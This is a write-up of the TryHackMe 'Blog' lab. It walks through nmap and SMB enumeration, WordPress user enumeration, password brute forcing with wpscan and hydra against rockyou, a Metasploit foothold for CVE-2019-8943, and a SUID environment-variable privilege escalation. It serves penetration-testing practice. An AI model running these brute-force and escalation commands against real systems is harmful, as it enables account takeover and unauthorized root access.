![Screenshot 2023-10-22 152156.png](Blog%2053d7680c1bb844b5a53e028207161e01/ip1yvzT.png)
![Screenshot 2023-10-22 152156.png](Blog%2053d7680c1bb844b5a53e028207161e01/618f1cc93596ff4082250bce9d869767 (1).png)

# Blog

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

*In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.*

*Credit to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the root privesc idea ;)*

**Difficulty:** Medium

## Scanning

```jsx
nmap -A -Pn -T4 10.10.250.0 -oN nmap_result.txt
```

![Screenshot 2023-10-22 152156.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_152156.png)

The inital scan shows `22`,`80`,`139`,and `445` open. We can safely assume we’re dealing with WordPress given the room icon. Since SMB is open we’ll start there to see if any shares that are configured for guest read or read write.

## SMB Enumeration

To do SMB Enumeration we can use following tools like `smbmap`, `smbclient`, Metasploit(`use auxiliary/scanner/smb/smb_enumshares`)

This  command-line tool that can be used to enumerate Samba shares on a target machine. You can use the following command to list the shares on a Samba server:

```jsx
smbmap -H 10.10.250.0
```

![Screenshot 2023-10-22 153628.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_153628.png)

## SMB File Download

```jsx
smbget -R smb://$IP/BillySMB/
```

or 

```jsx
smbclient //$IP/BillySMB
get <file_name>
```

![Screenshot 2023-10-22 154543.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_154543.png)

> Tip: If this were an FTP share you could use `wget` to recursively download files. `wget -r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET)`
> 

## Steganography

Hey, there’s a file name that looks familiar. It’s from [NinjaJc01](https://tryhackme.com/p/NinjaJc01)’s box Wonderland. Could this be a hint to not jump in the rabbit hole?

`steghide extract -sf Alice-White-Rabbit.jpg`

![Screenshot 2023-10-22 154942.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_154942.png)

I looked at the contents and started to get the hint… I’ll leave it to you to check out tswift.mp4 and check-this.png 😄️

## Wordpress

Looks like we’re dealing with a standard barebones WordPress instance. We’ll see what `wpscan` can enumerate for us but first let’s poke around a bit. From the two public posts we see Billy’s mom is a user and hovering over ‘By Karen Wheeler’ we see her username is `kwheel`.

![Screenshot 2023-10-22 155336.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_155336.png)

Scrolling down we can see a post from Billy with a username of `bjoel`. Let’s save the two usernames in a text file called `usernames.txt` that we’ll eventually use to brute force.

![Screenshot 2023-10-22 155644.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_155644.png)

## WordPress Enum.

WPScan including username enumeration

```jsx
wpscan --url http://blog.thm/ -e u
```

![Screenshot 2023-10-22 160017.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_160017.png)

![Screenshot 2023-10-22 160056.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_160056.png)

![Screenshot 2023-10-22 160119.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_160119.png)

From the scan we confirm the two usernames we found earlier. We also now know XML-RPC is enabled so we can leverage that for brute forcing.

Also, we see this is WordPress version 5.0 which has a Path Traversal and Local File Inclusion vulnerability that could lead to an authenticated RCE vulnerability `(CVE 2019-8943)`.

## WordPress Brute Force

```jsx
wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U username.txt -t 75
```

or you can use `hydra`

```jsx
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.250.0 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

![Screenshot 2023-10-22 161918.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_161918.png)

## Metasploit

I decided to use a metasploit module for the foothold. 

![Screenshot 2023-10-22 162322.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_162322.png)

![Screenshot 2023-10-22 162501.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_162501.png)

![Screenshot 2023-10-22 163031.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_163031.png)

Finally, we get the reverse shell. Now let’s find the hidden flags.

First Stabilize the shell

```jsx
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

## #user.txt

Looking for user.txt with `find / -type f -name user.txt 2>/dev/null` I can see there’s a file named user.txt in `/home/bjoel/` but after reading the file it’s not the real user flag.

```jsx
find / -type f -name user.txt 2>/dev/null
```

![Screenshot 2023-10-22 163842.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_163842.png)

## root prev.

```jsx
find / -perm -u=s -type f 2>/dev/null
```

or

```jsx
find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![Screenshot 2023-10-22 164606.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_164606.png)

So it is a root owned binary, with SUID flag on. What happens when we run it?

with the use of the `ltrace` tool, we can view their shared libraries.

> **ltrace** is a diagnostic and debugging tool for the command line that can be used to display calls that are made to shared libraries. It uses the dynamic library hooking mechanism, which allows it to intercept and record the dynamic library calls made by a process and the signals received by that process. [It can also intercept and print the system calls executed by the program](https://www.systutorials.com/docs/linux/man/1-ltrace/)
> 

![Screenshot 2023-10-22 164826.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_164826.png)

So it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?

![Screenshot 2023-10-22 165348.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_165348.png)

Now we can find the user.txt and root.txt flag! 

![Screenshot 2023-10-22 170023.png](Blog%2053d7680c1bb844b5a53e028207161e01/Screenshot_2023-10-22_170023.png)